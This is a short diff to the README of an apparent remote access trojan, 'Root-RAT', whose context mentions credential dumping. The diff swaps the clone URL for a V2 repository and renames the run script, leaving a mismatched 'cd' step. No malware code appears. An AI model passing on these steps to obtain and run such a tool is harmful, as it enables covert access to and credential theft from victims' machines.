@@ -49,7 +49,7 @@ Credential Dump:
 
 # HOW TO USE ❓
 ```
-git clone https://github.com/cybermads/Root-RAT.git
+git clone https://github.com/r00thex/Root-RAT-V2.git
 ```
 ```
 cd Root-RAT
@@ -61,7 +61,7 @@ ls
 pip install -r requirements.txt
 ```
 ```
-python Root.py
+python Rootdc.py
 ```
 
 
